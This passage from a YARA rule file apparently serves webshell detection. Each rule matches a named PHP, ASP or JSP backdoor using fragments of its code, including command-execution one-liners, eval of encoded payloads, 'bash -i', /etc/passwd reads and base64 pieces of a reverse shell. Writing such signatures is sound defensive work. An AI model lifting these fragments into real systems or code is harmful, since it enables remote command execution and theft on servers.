rule Backdoor_Webshell_PHP_000328
{
    meta:
        description = "github archive cpanel.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "function ftp_check($host,$user,$pass,$timeout){"
        $s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");"
        $s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>"
        $s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);"
        $s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
        $s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000329
{
    meta:
        description = "github archive accept_language.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000330
{
    meta:
        description = "github archive 529.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> "
        $s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
        $s9 = "echo '<PRE><P>This is exploit from <a "
        $s10 = "This Exploit Was Edited By KingDefacer"
        $s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 "
        $s14 = "$hardstyle = explode(\"/\", $file); "
        $s20 = "while($level--) chdir(\"..\"); "
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000331
{
    meta:
        description = "github archive stnc webshell v0.8.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];"
        $s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
        $s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000332
{
    meta:
        description = "github archive tryag.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>"
        $s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; "
        $s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; "
        $s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; "
        $s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000333
{
    meta:
        description = "github archive dc3 security crew shell priv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");"
        $s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));"
        $s13 = "header(\"Content-type: image/gif\");"
        $s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");"
        $s20 = "if (isset($_GET['rename_all'])) {"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000334
{
    meta:
        description = "github archiveqsd-php-backdoor.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
        $s2 = "if(isset($_POST[\"newcontent\"]))"
        $s3 = "foreach($parts as $val)//Assemble the path back together"
        $s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000335
{
    meta:
        description = "github archive spygrup.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");"
        $s6 = "if($_POST['root']) $root = $_POST['root'];"
        $s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>"
        $s18 = "By KingDefacer From Spygrup.org>"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000336
{
    meta:
        description = "github archive web-shell (c)shankar.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "header(\"Content-Length: \".filesize($_POST['downf']));"
        $s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
        $s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\""
        $s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000337
{
    meta:
        description = "github archive ayyildiz tim  -ayt- shell v 2.1 biz.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">"
        $s11 = "directory... Trust me - it works :-) */"
        $s15 = "/* ls looks much better with ' -F', IMHO. */"
        $s16 = "} else if ($command == 'ls') {"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000338
{
    meta:
        description = "github archive gamma web shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];"
        $s8 = "### Gamma Group <http://www.gammacenter.com>"
        $s15 = "my $error = \"This command is not available in the restricted mode.\\n\";"
        $s20 = "my $command = $self->query('command');"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000339
{
    meta:
        description = "github archive aspydrv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
        $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))"
        $s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1"
        $s17 = "If request.querystring(\"getDRVs\")=\"@\" then"
        $s20 = "' ---Copy Too Folder routine Start"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000340
{
    meta:
        description = "github archive jspwebshell 1.2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); "
        $s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
        $s4 = "// String tempfilepath=request.getParameter(\"filepath\");"
        $s15 = "endPoint=random1.getFilePointer();"
        $s20 = "if (request.getParameter(\"command\") != null) {"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000341
{
    meta:
        description = "github archive g00nshell-v1.3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s10 = "#To execute commands, simply include ?cmd=___ in the url. #"
        $s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];"
        $s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent"
        $s17 = "echo(\"<form method='GET' name='shell'>\");"
        $s18 = "echo(\"<form method='post' action='?act=sql'>\");"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000342
{
    meta:
        description = "github archive winx shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "// It's simple shell for all Win OS."
        $s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------"
        $s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>"
        $s13 = "// Created by greenwood from n57"
        $s20 = " if (is_uploaded_file($userfile)) {"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000343
{
    meta:
        description = "github archive phantasma.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ."
        $s15 = "if ($portscan != \"\") {"
        $s16 = "echo \"<br>Banner: $get <br><br>\";"
        $s20 = "$dono = get_current_user( );"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000344
{
    meta:
        description = "github archive cw.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "// Dump Database [pacucci.com]"
        $s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";"
        $s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);"
        $s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
        $s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";"
        $s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000345
{
    meta:
        description = "github archive php-include-w-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!"
        $s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\","
        $s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000346
{
    meta:
        description = "github archive mysql_tool.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";"
        $s20 = "$dump .= \"CREATE TABLE $table (\\n\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000347
{
    meta:
        description = "github archive phpspy ver 2006.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "var_dump(@$shell->RegRead($_POST['readregname']));"
        $s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
        $s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
        $s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000348
{
    meta:
        description = "github archive zyklonshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>"
        $s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">"
        $s2 = "<TITLE>404 Not Found</TITLE>"
        $s3 = "<H1>Not Found</H1>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000349
{
    meta:
        description = "github archive myshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
        $s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
        $s15 = "<title>$MyShellVersion - Access Denied</title>"
        $s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000350
{
    meta:
        description = "github archive lolipop.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "$commander = $_POST['commander']; "
        $s9 = "$sourcego = $_POST['sourcego']; "
        $s20 = "$result = mysql_query($loli12) or die (mysql_error()); "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000351
{
    meta:
        description = "github archive simple_cmd.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" "
        $s2 = "<title>G-Security Webshell</title>"
        $s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>"
        $s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000352
{
    meta:
        description = "github archive go-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "#change this password; for power security - delete this file =)"
        $s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};"
        $s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");"
        $s12 = "print << \"[kalabanga]\";"
        $s13 = "<title>GO.cgi</title>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000353
{
    meta:
        description = "github archive azrailphp v1.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
        $s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);"
        $s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu"
        $s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000354
{
    meta:
        description = "github archive zehir4"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "frames.byZehir.document.execCommand(command, false, option);"
        $s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000355
{
    meta:
        description = "github archive lostdc.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';"
        $s4 = "header ( \"Content-Description: Download manager\" );"
        $s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
        $s9 = "if (mkdir($_POST['dir'], 0777) == false) {"
        $s12 = "$ret = shellexec($command);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000356
{
    meta:
        description = "github archive casus 1.5.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
        $s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");"
        $s18 = "if (file_exists(\"F:\\\\\")){"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000357
{
    meta:
        description = "github archive ftpsearch.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "echo \"[-] Error : coudn't read /etc/passwd\";"
        $s9 = "@$ftp=ftp_connect('127.0.0.1');"
        $s12 = "echo \"<title>Edited By KingDefacer</title><body>\";"
        $s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000358
{
    meta:
        description = "github archivefrom files cyber shell.php, cybershell.php, cyber shell (v 1.0).php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
        $s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
        $s11 = " *   Coded by Pixcher"
        $s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000359
{
    meta:
        description = "github archivefrom files ajax_php command shell.php, ajax_php_command_shell.php, soldierofallah.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\","
        $s2 = "'Running processes' => \"runcommand('ps -aux','GET')\","
        $s3 = "$dt = $_POST['filecontent'];"
        $s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\","
        $s6 = "print \"Sorry, none of the command functions works.\";"
        $s11 = "document.cmdform.command.value='';"
        $s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000360
{
    meta:
        description = "github archive mysql"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "header(\"Content-disposition: filename=$filename.sql\");"
        $s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {"
        $s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";"
        $s4 = "if( $action == \"dumpTable\" )"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000361
{
    meta:
        description = "github archivefrom files small web shell by zaco.php, small.php, zaco.php, zacosmall.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];"
        $s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');"
        $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");"
        $s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000362
{
    meta:
        description = "github archive 8_filemanager_php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */"
        $s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ "
        $s3 = "/* I added this to ensure the script will run correctly..."
        $s14 = "<!--    </form>   -->"
        $s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">"
        $s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000363
{
    meta:
        description = "github archivefrom files kadot universal shell v0.1.6.php, kadot_universal_shell_v0.1.6.php, ka_ushell 0.1.6.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";"
        $s6 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {"
        $s12 = "if (!empty($_POST['c'])){"
        $s13 = "passthru($_POST['c']);"
        $s16 = "<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>"
        $s20 = "<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash"
        
    condition:
        3 of them
}
rule Backdoor_Webshell_PHP_000364
{
    meta:
        description = "github archivefrom files ph vayv.php, phvayv.php, ph_vayv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
        $s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {"
        $s17 = "name=\"duzenx2\" value=\"Klas"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000365
{
    meta:
        description = "github archivefrom files dive shell 1.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "$token = substr($_REQUEST['command'], 0, $length);"
        $s4 = "var command_hist = new Array(<?php echo $js_command_hist ?>);"
        $s7 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),"
        $s9 = "document.shell.command.value = command_hist[current_line];"
        $s16 = "$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $"
        $s19 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {"
        $s20 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {"
        
    condition:
        5 of them
}
rule Backdoor_Webshell_PHP_000366
{
    meta:
        description = "github archivefrom files crystalshell v.1.php, load_shell.php, loaderz web shell.php, stres.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))"
        $s4 = "\\$port = {$_POST['port']};"
        $s5 = "$_POST['installpath'] = \"temp.pl\";}"
        $s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
        $s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
        
    condition:
        4 of them
}
rule Backdoor_Webshell_PHP_000367
{
    meta:
        description = "github archivefrom files crystalshell v.1.php, erne.php, stres.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "<input type='submit' value='  open (shill.txt) '>"
        $s4 = "var_dump(curl_exec($ch));"
        $s7 = "if(empty($_POST['Mohajer22'])){"
        $s10 = "$m=$_POST['curl'];"
        $s13 = "$u1p=$_POST['copy'];"
        $s14 = "if(empty(\\$_POST['cmd'])){"
        $s15 = "$string = explode(\"|\",$string);"
        $s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");"
        
    condition:
        5 of them
}
rule Backdoor_Webshell_PHP_000368
{
    meta:
        description = "github archive 3_filemanager_php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "header('Content-Length:'.filesize($file).'');"
        $s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
        $s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;"
        $s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} "
        $s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000369
{
    meta:
        description = "github archivefrom files crystalshell v.1.php, load_shell.php, nshell.php, loaderz web shell.php, stres.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "if ($filename != \".\" and $filename != \"..\"){"
        $s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';"
        $s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';"
        $s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';"
        $s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';"
        $s10 = "foreach ($arr as $filename) {"
        $s19 = "else if( $mode & 0x6000 ) { $type='b'; }"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000370
{
    meta:
        description = "github archivefrom files gfs web-shell ver 3.1.7 - priv8.php, predator.php, gfs_web-shell_ver_3.1.7_-_priv8.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";"
        $s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";"
        $s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
        
        $a0 = "echo $uname.\"</font><br><b>\";"
        $a1 = "while(!feof($f)) { $res.=fread($f,1024); }"
        $a2 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
        
    condition:
        all of ($s*) or 2 of ($a*)
}
rule Backdoor_Webshell_PHP_000371
{
    meta:
        description = "github archivefrom files crystalshell v.1.php, sosyete.php, stres.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}"
        $s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}"
        $s11 = "scrollbar-darkshadow-color: #101842;"
        $s15 = "<a bookmark=\"minipanel\">"
        $s16 = "background-color: #EBEAEA;"
        $s18 = "color: #D5ECF9;"
        $s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000372
{
    meta:
        description = "github archivefrom files cyber shell.php, cybershell.php, cyber shell (v 1.0).php, phpremoteview.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; "
        $s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; "
        $s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; "
        $s12 = "else if( $mode & 0xA000 ) "
        $s17 = "$s=sprintf(\"%1s\", $type); "
        $s20 = "font-size: 8pt;"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000373
{
    meta:
        description = "github archivefrom files rootshell.php, rootshell.v.1.0.php, s72 shell v1.1 coding.php, s72_shell_v1.1_coding.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s5 = "$filename = $backupstring.\"$filename\";"
        $s6 = "while ($file = readdir($folder)) {"
        $s7 = "if($file != \".\" && $file != \"..\")"
        $s9 = "$backupstring = \"copy_of_\";"
        $s10 = "if( file_exists($file_name))"
        $s13 = "global $file_name, $filename;"
        $s16 = "copy($file,\"$filename\");"
        $s18 = "<td width=\"49%\" height=\"142\">"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000374
{
    meta:
        description = "github archivefrom files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s1 = "// me at pentestmonkey@pentestmonkey.net"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000375
{
    meta:
        description = "github archive 6_filemanager_php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        super_rule = 1
        
    strings:
        $s2 = "@eval(stripslashes($_POST['phpcode']));"
        $s5 = "echo shell_exec($com);"
        $s7 = "if($sertype == \"winda\"){"
        $s8 = "function execute($com)"
        $s12 = "echo decode(execute($cmd));"
        $s15 = "echo system($com);"
        
    condition:
        4 of them
}
rule Backdoor_Webshell_PHP_000376
{
    meta:
        description = "auto-generated ssh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "eval(gzinflate(str_rot13(base64_decode('"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000377
{
    meta:
        description = "auto-generated orice2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = " $aa = $_GET['aa'];"
        $s1 = "echo $aa;"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000378
{
    meta:
        description = "auto-generated sincap.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
        $s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000379
{
    meta:
        description = "auto-generated phpshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000380
{
    meta:
        description = "auto-generated imhapftp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000381
{
    meta:
        description = "auto-generated ka_ushell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
        $s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000382
{
    meta:
        description = "auto-generated php backdoor v1.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
        $s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000383
{
    meta:
        description = "auto-generated remview.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
        $s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
        $s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000384
{
    meta:
        description = "auto-generated saphpshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000385
{
    meta:
        description = "auto-generated casus15.php"
